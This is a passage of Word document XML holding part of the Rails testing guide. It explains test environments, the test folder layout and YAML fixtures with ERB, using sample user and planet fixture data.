    <w:p w14:paraId="326DA001" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId641" w:anchor="10-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Functional Testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32A0230D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="309"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId642" w:anchor="11" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Other Testing Approaches</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="446D77A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 Why Write Tests for your Rails Applications?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3693F18C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="310"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Rails makes it super easy to write your tests. It starts by producing skeleton test code in the background while you are creating your models and controllers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A66452" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="310"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>By simply running your Rails tests you can ensure your code adheres to the desired functionality even after some major code refactoring.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E637D2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="310"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Rails tests can also simulate browser requests and thus you can test your application’s response without having to test it through your browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C5E397" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Introduction to Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B8F332" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Testing support was woven into the Rails fabric from the beginning. It wasn’t an “oh! let’s bolt on support for running tests because they’re new and cool” epiphany. Just about every Rails application interacts heavily with a database – and, as a result, your tests will need a database to interact with as well. To write efficient tests, you’ll need to understand how to set up this database and populate it with sample data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5688BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 The Three Environments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC90171" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Every Rails application you build has 3 sides: a side for production, a side for development, and a side for testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69494834" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">One place you’ll find this distinction is in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file. This </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> configuration file has 3 different sections defining 3 unique database setups:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B63F258" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="311"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>production</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0454F2B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="311"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>development</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EEFFD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="311"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D8990A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This allows you to set up and interact with test data without any danger of your tests altering data from your production environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4074039A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, suppose you need to test your new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>delete_this_user_and_every_everything_associated_with_it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> function. Wouldn’t you want to run this in an environment where it makes no difference if you destroy data or not?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBB053C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you do end up destroying your testing database (and it will happen, trust me), you can rebuild it from scratch according to the specs defined in the development database. You can do this by running </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake db:test:prepare</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC4A3EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Rails Sets up for Testing from the Word Go</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D12F08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails creates a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder for you as soon as you create a Rails project using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>application_name</w:t>
      </w:r>
      <w:r>
        <w:t>. If you list the contents of this folder then you shall see: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0E702496" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18063CBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ls -F test/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42552229" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="570C5044" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>fixtures/       functional/     integration/    test_helper.rb  unit/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F3846D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder is meant to hold tests for your models, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>functional</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder is meant to hold tests for your controllers, and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>integration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder is meant to hold tests that involve any number of controllers interacting. Fixtures are a way of organizing test data; they reside in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>fixtures</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test_helper.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file holds the default configuration for your tests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D02705C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 The Low-Down on Fixtures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519D538F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For good tests, you’ll need to give some thought to setting up test data. In Rails, you can handle this by defining and customizing fixtures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9B827F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.1 What are Fixtures?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EA0B0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Fixtures</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a fancy word for sample data. Fixtures allow you to populate your testing database with predefined data before your tests run. Fixtures are database independent and assume a single format: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B674B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You’ll find fixtures under your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/fixtures</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory. When you run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails generate model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to create a new model, fixture stubs will be automatically created and placed in this directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA89ADF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314A49A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-formatted fixtures are a very human-friendly way to describe your sample data. These types of fixtures have the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file extension (as in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>users.yml</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F89A8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s a sample </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fixture file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="09D0A9ED" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="214E2256" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># lo &amp; behold!  I am a YAML comment!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D881488" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>david:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="788896B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> name: David Heinemeier Hansson</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B0A1D15" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> birthday: 1979-10-15</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E0A7031" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> profession: Systems development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="317EDF2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B444684" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>steve:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35522440" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> name: Steve Ross Kellock</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B456D1D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> birthday: 1974-09-27</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2177BE6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> profession: guy with keyboard</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25138C2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Each fixture is given a name followed by an indented list of colon-separated key/value pairs. Records are separated by a blank space. You can place comments in a fixture file by using the # character in the first column.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F50165" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.3 ERB’in It Up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47436D3D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows you to embed ruby code within templates. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fixture format is pre-processed with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when you load fixtures. This allows you to use Ruby to help you generate some sample data.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6048"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0DFD1FA1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00C28638" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>earth_size = 20</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41A3C9A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>mercury:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="437B745E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  size: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>earth_size / 50</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="722C0CA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  brightest_on: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>113.days.ago.to_s(:db) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EEDEF42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29007E3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>venus:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12F793AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  size: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>earth_size / 2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EE8F916" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  brightest_on: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>67.days.ago.to_s(:db) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AA8A566" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02DDFCD2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>mars:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1938B1B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  size: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>earth_size - 69</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F05D65B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  brightest_on: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>13.days.from_now.to_s(:db) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42B30A4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Anything encased within the</w:t>
